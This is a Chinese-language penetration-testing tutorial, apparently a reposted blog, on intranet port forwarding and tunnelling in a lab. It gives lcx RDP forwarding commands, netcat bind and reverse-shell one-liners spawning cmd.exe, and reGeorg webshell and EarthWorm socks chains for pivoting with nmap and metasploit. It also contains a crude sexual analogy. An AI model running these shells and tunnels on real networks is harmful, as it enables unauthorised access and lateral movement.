原文 by [CH_vksec](http://ch.vksec.com/2017/06/blog-post_72.html)  
最近尝试了一些内网端口的转发和内网穿透，现在一起总结一下。  
![](../pictures/port-forwarding-1.png)    
## 0x01 正向和反向代理
正向代理中，proxy 和 client 同属一个 LAN，对 server 透明； 反向代理中，proxy 和 server 同属一个 LAN，对 client 透明。 实际上 proxy 在两种代理中做的事都是代为收发请求和响应，不过从结构上来看正好左右互换了下，所以把前者那种代理方式叫做正向代理，后者叫做反向代理。  
### 正向代理 (Forward Proxy)  
Lhost－－》proxy－－》Rhost  
Lhost 为了访问到 Rhost，向 proxy 发送了一个请求并且指定目标是 Rhost，然后 proxy 向 Rhost 转交请求并将获得的内容返回给 Lhost，简单来说正向代理就是 proxy 代替了我们去访问 Rhost。  
### 反向代理（reverse proxy）
LhostproxyfirewallRhost  
和正向代理相反（废话），Lhost 只向 proxy 发送普通的请求，具体让他转到哪里，proxy 自己判断，然后将返回的数据递交回来，这样的好处就是在某些防火墙只允许 proxy 数据进出的时候可以有效的进行穿透  
### 简单区分
正向代理代理的是客户端，反向代理代理的是服务端，正向代理是我们自己 (Lhost) 戴套 (proxy) 插进去，反向代理是她 (Rhost) 主动通过上位 (proxy) 坐上来(Lhost)。  
## 0x02 lcx 转发
内网 IP：192.168.153.138  
公网 ip：192.168.153.140  
由于是本地实验，我这里将 138 的防火墙打开，当作内网环境，140 防火墙关闭，充当公网 ip，所以正常情况下不只能 138 访问 140，而 140 不能直接访问 138。这是两台机器互相 ping 的结果。  
![](../pictures/port-forwarding-2.png)   
![](../pictures/port-forwarding-3.png)    
1. 内网机器上执行：lcx.exe –slave 公网 IP + 端口 内网 IP + 端口  
`lcx.exe –slave 192.168.153.140 4444 192.168.153.138 3389`  
![](../pictures/port-forwarding-4.png)    
将内网 (192.168.153.138) 的 3389 端口转发到公网 (192.168.153.138) 的 4444 端口  
2. 公网 (192.168.153.138) 执行：`lcx -listen 4444 5555`  
![](../pictures/port-forwarding-5.png)    
监听公网 4444 端口请求，并将 4444 的请求传送给 5555 端口。 
此时已经把内网的 3389 端口转发到了公网的 5555 端口。可以通过 127.0.0.1:5555 连接到内网的远程桌面。  
![](../pictures/port-forwarding-6.png)    
![](../pictures/port-forwarding-7.png)    
## 0x03 nc 反弹
### 正向连接
在内网执行  
`nc -l -p 5555 -t -e cmd.exe`  
![](../pictures/port-forwarding-8.png)    
-t是通过 telne 模式执行 cmd.exe 程序，可以省略。  
在公网执行  
`nc -nvv 192.168.153.138 5555`  
![](../pictures/port-forwarding-9.png)    
### 反向连接
在公网监听nc -lp 5555  
![](../pictures/port-forwarding-10.png)      
在内网机器反弹nc -t -e cmd 192.168.153.140 5555  
![](../pictures/port-forwarding-11.png)     
## 0x04 socks 代理工具
常见的 socks 代理工具介绍如下  
1. Earthworm 工具网址：http://rootkiter.com/EarthWorm  
EW 是一套便携式的网络穿透工具，具有 SOCKS v5 服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以 "正向"、"反向"、"多级级联" 等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内, 强烈推荐使用。   
目前已经有了最新版 Termite，工具网址：http://rootkiter.com/Termite/    
2. reGeorg 工具网址：https://github.com/NoneNotNull/reGeorg  
reGeorg 是 reDuh 的升级版，主要是把内网服务器的端口通过 http/https 隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。它利用 webshell 建立一个 socks 代理进行内网穿透，服务器必须支持 aspx、php 或 jsp 这些 web 程序中的一种。  
3. sSocks 工具网址：http://sourceforge.net/projects/ssocks/  
sSocks 是一个 socks 代理工具套装，可用来开启 socks 代理服务，支持 socks5 验证，支持 IPV6 和 UDP，并提供反向 socks 代理服务，即将远程计算机作为 socks 代理服务端，反弹回本地，极大方便内网的渗透测试，其最新版为 0.0.13。  
4. SocksCap64 工具网址：http://www.sockscap64.com (需翻墙)  
SocksCap64 是一款在 windows 下相当好使的全局代理软件。SocksCap64 可以使 Windows 应用程序通过 SOCKS 代理服务器来访问网络而不需要对这些应用程序做任何修改, 即使某些本身不支持 SOCKS 代理的应用程序通过 SocksCap64 之后都可以完美的实现代理访问。  
5. proxychains 工具网址：http://proxychains.sourceforge.net/  
Proxychains 是一款在 LINUX 下可以实现全局代理的软件，性能相当稳定可靠。在使任何程序通过代理上网，允许 TCP 和 DNS 通过代理隧道，支持 HTTP、SOCKS4、SOCKS5 类型的代理服务器，支持 proxy chain，即可配置多个代理，同一个 proxy chain 可使用不同类型的代理服务器  
### 0x04.1 reGeorg+Proxychains 代理  
上传 reGeorg 的 tunnel.jsp 到服务器。访问链接，并转发到本地端口。  
`python reGeorgSocksProxy.py -p 1080 -u http://192.168.153.137/tunnel.jsp`    
![](../pictures/port-forwarding-12.png)    
使用设置 proxychains 的代理端口，进行访问，一般配合 nmap 和 metasploit 进行后续内网渗透。ps：proxychains 不支持 udp 和 icmp 协议，所以使用 nmap 要加上-sT -Pn即使用 tcp 协议且不使用 icmp 协议。  
![](../pictures/port-forwarding-13.png)    
### 0x04.2 ew 穿透
该工具借用了 ssocks 和 lcx.exe 的操作逻辑，并进行更多的功能强化。  
![](../pictures/port-forwarding-14.png)    
说明  
目前工具提供六种链路状态，可通过 -s 参数进行选定，分别为:      
`ssocksd   rcsocks   rssocks        lcx_slave lcx_tran  lcx_listen `      
其中 SOCKS5 服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。        
其余的 lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。   
lcx 类别管道：  
lcx_slave  该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。     
lcx_tran   该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。    
lcx_listen 该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。       
通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。       
下面是一个三级跳的本地测试例子。 
```
./ew -s rcsocks -l 1080 -e 8888     
./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999     
./ew -s lcx_listen -l 9999 -e 7777     
./ew -s rssocks -d 127.0.0.1 -e 7777